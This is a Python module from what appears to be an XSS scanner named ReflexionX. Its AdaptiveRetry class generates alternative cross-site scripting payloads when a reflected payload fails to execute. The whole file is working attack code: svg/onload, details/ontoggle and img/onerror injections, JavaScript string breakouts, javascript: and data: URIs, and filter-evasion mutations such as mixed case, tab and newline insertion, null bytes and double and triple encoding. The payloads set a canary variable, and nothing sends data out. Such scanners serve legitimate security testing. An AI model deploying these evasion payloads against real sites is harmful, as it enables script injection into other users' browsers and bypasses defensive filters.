#!/usr/bin/env python3
"""
XSS ReflexionX v1.0.0 — Adaptive Retry / Feedback Loop
When reflection exists but execution fails, retries with mutation strategies.

Usage:
    from feedback_loop import AdaptiveRetry
    retry = AdaptiveRetry(canary="HF5XSSCONFIRMED")
    alternatives = retry.suggest(url, param, context="html_body",
                                  original_payload="<script>...", encoding="raw")
"""

import argparse, re
from urllib.parse import quote as url_quote


class AdaptiveRetry:
    """Generates alternative payloads when initial execution fails.

    Strategy pipeline (applied in order):
      1. Encoding variation (URL-encode, double-encode, HTML entities)
      2. Different payload class (switch tag type / event handler)
      3. DOM-based payloads (fragment injection, javascript: URI)
      4. Case mutation (mixed case tags)
      5. Whitespace / null-byte insertion
    """

    MAX_RETRIES = 3

    def __init__(self, canary="HF5XSSCONFIRMED", max_retries=None):
        self.canary = canary
        self.max_retries = max_retries or self.MAX_RETRIES

    def suggest(self, url, param, context="html_body", original_payload="",
                encoding="raw", attempt=1):
        """Return list of alternative (payload, strategy_name) tuples.

        Parameters
        ----------
        attempt : int
            Current attempt number (1-indexed). Returns empty if > max_retries.
        """
        if attempt > self.max_retries:
            return []

        alternatives = []
        c = self.canary

        # Strategy 1: Encoding variations
        if attempt >= 1:
            alternatives.extend(self._encoding_mutations(original_payload))

        # Strategy 2: Different payload class
        if attempt >= 1:
            alternatives.extend(self._class_switch(context, c))

        # Strategy 3: DOM-based payloads
        if attempt >= 2:
            alternatives.extend(self._dom_payloads(c))

        # Strategy 4: Case mutations
        if attempt >= 2:
            alternatives.extend(self._case_mutations(original_payload))

        # Strategy 5: Whitespace / null-byte tricks
        if attempt >= 3:
            alternatives.extend(self._evasion_tricks(context, c))

        # Deduplicate and exclude original
        seen = {original_payload}
        result = []
        for payload, strategy in alternatives:
            if payload not in seen:
                seen.add(payload)
                result.append((payload, strategy))

        return result

    # ── Strategy implementations ─────────────────────────────
    def _encoding_mutations(self, payload):
        results = []
        # URL encode
        results.append((url_quote(payload, safe=""), "url_encode"))
        # Double encode
        results.append((url_quote(url_quote(payload, safe=""), safe=""), "double_encode"))
        # HTML entity encode angle brackets
        results.append((payload.replace("<", "&lt;").replace(">", "&gt;"), "html_entity"))
        # Numeric entities
        results.append((payload.replace("<", "&#60;").replace(">", "&#62;"), "numeric_entity"))
        # Unicode escapes for JS
        results.append((payload.replace("alert", "\\u0061lert"), "unicode_escape"))
        return results

    def _class_switch(self, context, canary):
        results = []
        if context in ("html_body", "html_attribute", "unknown"):
            # Switch between different event handler tags
            results.append((f"<svg/onload=window._xss_confirmed='{canary}'>", "svg_onload"))
            results.append((f"<details open ontoggle=window._xss_confirmed='{canary}'>", "details_toggle"))
            results.append((f"<input onfocus=window._xss_confirmed='{canary}' autofocus>", "input_focus"))
            results.append((f"<video src=x onerror=window._xss_confirmed='{canary}'>", "video_error"))
            results.append((f"<body onload=window._xss_confirmed='{canary}'>", "body_onload"))
            results.append((f"<marquee onstart=window._xss_confirmed='{canary}'>", "marquee_start"))
            results.append((f"<div id=x tabindex=1 onfocus=window._xss_confirmed='{canary}'></div>", "div_focus"))
        if context in ("javascript", "json"):
            results.append((f"';window._xss_confirmed='{canary}'//", "js_single_break"))
            results.append((f'";window._xss_confirmed=\'{canary}\'//','js_double_break'))
            results.append((f"`;window._xss_confirmed='{canary}'//", "js_backtick_break"))
            results.append((f"}}}};window._xss_confirmed='{canary}';//", "js_closure_break"))
        return results

    def _dom_payloads(self, canary):
        results = []
        results.append((f"javascript:window._xss_confirmed='{canary}'", "javascript_uri"))
        results.append((f"#<img src=x onerror=window._xss_confirmed='{canary}'>", "fragment_injection"))
        results.append((f"data:text/html,<script>window._xss_confirmed='{canary}'</script>", "data_uri"))
        results.append((f"jaVasCript:window._xss_confirmed='{canary}'", "mixed_case_uri"))
        return results

    def _case_mutations(self, payload):
        results = []
        # Mixed case tags
        tags = re.findall(r'</?(\w+)', payload)
        if tags:
            mixed = payload
            for tag in tags:
                mt = ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(tag))
                mixed = mixed.replace(f"<{tag}", f"<{mt}", 1)
                mixed = mixed.replace(f"</{tag}", f"</{mt}", 1)
            results.append((mixed, "mixed_case"))
        # Uppercase all
        upper = payload
        for tag in tags:
            upper = upper.replace(f"<{tag}", f"<{tag.upper()}", 1)
        if upper != payload:
            results.append((upper, "uppercase_tags"))
        return results

    def _evasion_tricks(self, context, canary):
        results = []
        # Tab/newline insertion in tags
        results.append((f"<img\tsrc=x\tonerror=window._xss_confirmed='{canary}'>", "tab_insertion"))
        results.append((f"<img\nsrc=x\nonerror=window._xss_confirmed='{canary}'>", "newline_insertion"))
        # Null byte (rarely works but worth trying)
        results.append((f"<img%00src=x onerror=window._xss_confirmed='{canary}'>", "null_byte"))
        # Forward slash trick
        results.append((f"<svg/onload=window._xss_confirmed='{canary}'>", "slash_trick"))
        # Double encoding of angle brackets
        results.append((f"%253Cimg src=x onerror=window._xss_confirmed='{canary}'%253E", "triple_encode"))
        return results


# ── CLI self-test ────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ReflexionX v1.0.0 — Adaptive Retry self-test")
    parser.add_argument("--test", action="store_true")
    args = parser.parse_args()

    if args.test:
        retry = AdaptiveRetry()
        original = "<script>window._xss_confirmed='HF5XSSCONFIRMED'</script>"

        for attempt in range(1, 4):
            alts = retry.suggest("http://test.com?q=1", "q",
                                  context="html_body", original_payload=original,
                                  attempt=attempt)
            print(f"  Attempt {attempt}: {len(alts)} alternatives")
            for payload, strategy in alts[:3]:
                print(f"    [{strategy}] {payload[:80]}...")

        # Test JS context
        alts_js = retry.suggest("http://test.com?q=1", "q",
                                 context="javascript", original_payload="';alert(1)//",
                                 attempt=1)
        print(f"  JS context: {len(alts_js)} alternatives")

        # Test max retries
        alts_over = retry.suggest("http://test.com?q=1", "q", attempt=4)
        assert len(alts_over) == 0, "Should return empty past max retries"

        print("\n[OK] Adaptive retry self-test passed")
    else:
        print("Usage: python3 feedback_loop.py --test")
